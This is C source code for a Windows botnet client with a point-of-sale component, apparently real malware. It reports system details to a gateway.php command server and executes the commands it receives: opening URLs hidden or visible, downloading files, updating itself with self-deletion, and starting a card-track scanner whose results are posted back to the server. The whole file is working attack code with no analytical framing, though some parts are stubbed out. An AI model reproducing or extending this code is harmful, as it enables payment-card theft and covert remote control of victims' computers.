
#pragma comment(lib, "wininet.lib")
#include <windows.h> 
#include <wininet.h>
#include <tchar.h>
#include <urlmon.h>
#include <Shlobj.h>
#include <Shlwapi.h>
#include "http.h"
#include "core.h"
#include "stdlib.h"
#include "Download\download.h"
#include "Config.h"
#include "RUNPE\rundll.h"
#include "socks\socks.h"
#include "PoS\scan.h"
const char* Domain = "127.0.0.1";
const char* Alive = "/bot/gateway.php?alive";
const char* Command = "/bot/gateway.php?command";
const char* Track = "/bot/gateway.php?track";
TCHAR hdrs[] = _T("Content-Type: application/x-www-form-urlencoded");
VOID CreatePos();
VOID Visit(char *sUrl);

VOID Update(CHAR* sUrl);
VOID HiddenVisit(CHAR* sUrl);
#define NORMALHTTP

char *encryption(char *meme);


BOOL HttpTrack(CHAR *data) 
{
	CHAR *encrypteddata = encryption(data);
	CHAR meme[624];
	wsprintf(meme, "&bot_id=%s&trackdata=%s", getHwid(), encrypteddata);
	HINTERNET hSession = InternetOpenA(USERAGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	HINTERNET hConnect = InternetConnectA(hSession, Domain, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", Track, NULL, NULL, NULL, 0, 1);

	BOOL RetVal = HttpSendRequestA(hRequest, hdrs, strlen(hdrs), meme, strlen(meme));

	InternetCloseHandle(hSession);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hRequest);
	HeapFree(GetProcessHeap(), 0, encrypteddata);
	return RetVal;
}
BOOL HttpPost(CHAR *data)
{
	CHAR meme[624];
	wsprintf(meme, "&bot_id=%s&cmd_id=%s&cmd_status=ok", getHwid(), data);
	HINTERNET hSession = InternetOpenA(USERAGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	HINTERNET hConnect = InternetConnectA(hSession, Domain, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", Command, NULL, NULL, NULL, 0, 1);

	BOOL RetVal = HttpSendRequestA(hRequest, hdrs, strlen(hdrs), meme, strlen(meme));

	InternetCloseHandle(hSession);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hRequest);
	return RetVal;
}
char * tohex(unsigned char *s) {
	size_t i, len = strlen(s) * 2;
	char *buff = HeapAlloc(GetProcessHeap(), 0, len + 1);
	if (buff != NULL) {
		for (i = 0; i < len; i += 2) {
			wsprintf(&(buff[i]), "%02X", *s++);
		}
	}

	return buff;
}
char *inttochar(int meme) {
	char sizes[20];
	wsprintf(sizes, "%d", meme);
	return tohex(sizes);
}
char *encryption(char *meme) {
	//encryption routine
	return tohex(meme);
}

void PostRoutine()
{
	CHAR httpBody[524];
	CHAR *encryptedcspu = encryption(getProc());
	CHAR *encryptedhwid = encryption(getHwid());
	CHAR *encryptedsys = encryption(getSys());
	CHAR *encryptedisadmin = encryption(IsAdmin());
	CHAR *encryptedversion = encryption(getversion());
	CHAR *encryptedgetsystem = encryption(getSys());
	CHAR *encryptedgpu = encryption(getGPU());
	CHAR *encryptedgetdisk = inttochar(getDisk());
	CHAR *encryptedgetram = inttochar(getRam());


#ifdef TOR
	// removed tor codee



#endif



	#ifdef NORMALHTTP
	wsprintf(httpBody, "&proc=%s&bot_id=%s&space=%s&ram=%s&arch=%s&isAdmin=%s&os=%s&gpu=%s&version=312E30", encryptedcspu, encryptedhwid, encryptedgetdisk, encryptedgetram, encryptedgetsystem, encryptedisadmin, encryptedversion, encryptedgpu);
	//MessageBox(0, httpBody, "!", 0);
	HINTERNET hSession = InternetOpenA("icel", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	HINTERNET hConnect = InternetConnectA(hSession, Domain, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", Alive, NULL, NULL, NULL, 0, 1);

	if (HttpSendRequestA(hRequest, hdrs, strlen(hdrs), httpBody, strlen(httpBody)))
	{
		CHAR Buffer[2048];
		DWORD dwRead = 0;
		 
		RtlSecureZeroMemory(&Buffer, sizeof(Buffer));
		while (InternetReadFile(hRequest, Buffer, sizeof(Buffer), &dwRead) && dwRead)
		{
			Buffer[dwRead] = 0;
			dwRead = 0;
		}

		if (sizeof(Buffer) != 0)
		{
			char * string_token = 0;
			char **string_tokens = HeapAlloc(GetProcessHeap(), 0, sizeof(char *));

			int string_tokens_count = 0;
			string_token = zstrtok(Buffer, " ");
			while (string_token != NULL)
			{
				string_tokens_count++;
				string_tokens = HeapReAlloc(GetProcessHeap(), 0, string_tokens, sizeof(char *) * string_tokens_count);

				string_tokens[string_tokens_count - 1] = string_token;
				 
				string_token = zstrtok(NULL, " ");
			}
			 
			long switchs = zstrtol(string_tokens[0], NULL, 10);
			switch (switchs) {
				case 1:
					HiddenVisit(string_tokens[1]);
					HttpPost(string_tokens[2]);
					break;
				case 2:
					Visit(string_tokens[1]);
					HttpPost(string_tokens[2]);
					break;
				case 3:

					dl(string_tokens[1]);

						HttpPost(string_tokens[2]);
					
					break;
				case 4:
					Update(string_tokens[1]);
					HttpPost(string_tokens[2]);
				case 6:
					CreatePos();
				default: 
					break;
			}
			for (int i = 0; i < string_tokens_count; i++) {
				RtlSecureZeroMemory(string_tokens[i], strlen(string_tokens[i]));
			} 
			HeapFree(GetProcessHeap(), 0, string_tokens);
			HeapFree(GetProcessHeap(), 0, encryptedcspu);
			HeapFree(GetProcessHeap(), 0, encryptedhwid);
			HeapFree(GetProcessHeap(), 0, encryptedsys);
			HeapFree(GetProcessHeap(), 0, encryptedisadmin);
			HeapFree(GetProcessHeap(), 0, encryptedversion);
			HeapFree(GetProcessHeap(), 0, encryptedgetsystem);
			HeapFree(GetProcessHeap(), 0, encryptedgpu);
			HeapFree(GetProcessHeap(), 0, encryptedgetdisk);
			HeapFree(GetProcessHeap(), 0, encryptedgetram);
		}
		InternetCloseHandle(hSession);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hRequest);
	}
	else {

		HeapFree(GetProcessHeap(), 0, encryptedcspu);
		HeapFree(GetProcessHeap(), 0, encryptedhwid);
		HeapFree(GetProcessHeap(), 0, encryptedsys);
		HeapFree(GetProcessHeap(), 0, encryptedisadmin);
		HeapFree(GetProcessHeap(), 0, encryptedversion);
		HeapFree(GetProcessHeap(), 0, encryptedgetsystem);
		HeapFree(GetProcessHeap(), 0, encryptedgpu);
		HeapFree(GetProcessHeap(), 0, encryptedgetdisk);
		HeapFree(GetProcessHeap(), 0, encryptedgetram);
		return;
	}
#endif
}


VOID Visit(char *sUrl)
{
	ShellExecuteA(0, 0, sUrl, 0, 0, SW_SHOW);
	return;
}

VOID HiddenVisit(CHAR* sUrl)
{
	ShellExecuteA(0, 0, sUrl, 0, 0, SW_HIDE);
	return;
}
VOID SelfDestruct()
{
	SHELLEXECUTEINFO sei;

	TCHAR szModule[MAX_PATH], szComspec[MAX_PATH], szParams[MAX_PATH];

	if ((GetModuleFileName(0, szModule, MAX_PATH) != 0) && (GetShortPathName(szModule, szModule, MAX_PATH) != 0) &&	(GetEnvironmentVariable("COMSPEC", szComspec, MAX_PATH) != 0))
	{
		lstrcpy(szParams, "/c del ");
		lstrcat(szParams, szModule);
		lstrcat(szParams, " > nul");

		sei.cbSize = sizeof(sei);
		sei.hwnd = 0;
		sei.lpVerb = "Open";
		sei.lpFile = szComspec;
		sei.lpParameters = szParams;
		sei.lpDirectory = 0;
		sei.nShow = SW_HIDE;
		sei.fMask = SEE_MASK_NOCLOSEPROCESS;

		if (ShellExecuteEx(&sei))
		{
			SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS); //removing process stops
			SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS); //accelerate our process
			SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL); //accelerate our thread
			SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, szModule, 0);
			return;
		}
	}
}
BOOL dl(char *url) {
		PBYTE pBuf;
		DWORD dwSize;
		HANDLE hFile;
		DWORD bb;
		HANDLE hHeap = getfile(url, &pBuf, &dwSize);
		if (hHeap)
		{
				return TRUE;
				
			
				HeapFree(hHeap, 0, pBuf);
			
		}
		else
		{
			return FALSE;
			
		}
}

VOID CreatePos() {

	CreateThread(NULL, 0, &UploadTimer, NULL, 0, NULL);
	while (1) {
		ScanForTracks(QueueUpload);
		Sleep(PROCESS_SLEEP_MS);
	}
}
VOID Update(CHAR* sUrl) {
	dl(sUrl);
	//	removeAppFromStartUp();
	SelfDestruct();
	ExitProcess(0);
}
